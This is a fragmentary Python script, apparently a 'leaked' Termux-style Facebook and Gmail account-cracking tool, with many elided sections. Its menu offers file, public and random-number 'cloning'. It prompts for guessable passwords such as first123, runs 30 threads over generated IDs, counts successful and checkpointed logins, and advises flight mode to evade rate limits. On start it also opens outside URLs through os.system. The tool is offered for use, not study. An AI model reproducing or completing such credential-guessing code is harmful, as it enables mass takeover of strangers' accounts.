#LEAKED BY : KGF TRICKER 
#AIKNG TATA LATEST SC 
#ENJOY GUYS
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://facebook.com/100088479414960/')
...
____                .___.__          
 ...
 |_______ (____  /\____ | |____(____  /
          \/    \/      \/           \/ 
                       ----------------------------------------------
 \033[1;32mAuthor ----------> : ALI.TRICKER
  \033[1;33mGithub  ---------->: ALI.TRICKER
  \033[1;32mFacebook  ---------->: ALI
  \033[1;33mTool Name  ---------->: ALI-TRICKER
  \033[1;32mType type  ---------->: FREE
  \033[1;33mVersion  ---------->: 1.1
----------------------------------------------
 \033[1;31mFor Haters: KGF-TRICKER NAME TO SUNA HOGA
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' \033[1;33m[1] File cloning\n \033[1;32m[2] Create ids file\n [\033[1;33m3] Public cloning\n \033[1;32m[4] Random number cloning\n \033[1;33m[5] Random gmail crack\n \033[1;32m[6] WhatsApp Group (join)\n \033[1;33m[7] Download Vpn\n \033[1;32m[8] How To Use Video\n \033[1;31m[0] Exit menu')
                        linex()
                        print ('\033[1;32m KOI AK OPTION SELECT KR😒')
                        xd=input(' \033[1;32m Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;32mPut file example:  \033[1;33m/sdcard/File.txt  etc..')
                                linex()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' \033[1;32mAll method working try 1 by 1 ')
                                linex()
                                print(' \033[1;32m[1] Method 1 (for new ids) \n \033[1;33m[2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ...
                                        ps_limit =1
                                linex()
                                print('\033[1;33m try: first last,firtslast,first123,last1122')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' \033[1;32mChoose:\033[1;32m ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                ...
                                os.system('xdg-open https://wa.me/+923175734972?text=');menu()
                        elif xd in ['7','07']:
...
def pak():
                ...
                with tred(max_workers=30) as SHAZAD:     
                        ...
                        print(f'\033[1;31m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def gmail():
                ...
                linex()
                print('\033[1;33m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' \033[1;32mPut last name: ')
                linex()
                print(' \033[1;32mExample: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                ...
                with tred(max_workers=30) as SHAZAD:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;31m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;31m [KGF-TRICKER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
